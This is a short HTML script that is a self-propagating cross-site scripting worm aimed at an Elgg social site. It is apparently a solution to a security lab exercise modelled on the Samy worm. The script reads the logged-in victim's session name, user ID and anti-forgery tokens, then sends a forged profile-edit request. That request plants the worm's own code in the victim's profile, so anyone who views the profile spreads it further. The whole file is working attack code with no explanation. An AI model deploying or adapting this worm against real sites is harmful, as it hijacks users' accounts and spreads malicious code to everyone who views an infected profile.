<script id="worm">
window.onload = function() {

	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

	//JavaScript code to access user name, user guid, __elgg_ts and __elgg_token
	var userName=elgg.session.user.name;
	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;

	//Construct the content of your URL.
	var name="&name="+userName
	var description = "&description=Samy is the GOAT" + wormCode + "&accesslevel[description]=2"; 
	var sendurl="http://www.xsslabelgg.com/action/profile/edit";
	var content=token+ts+name+description+guid;

	var samyGuid=47

	if(elgg.session.user.guid!=samyGuid) {
		//Create and send Ajax request to modify profile.
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
</script>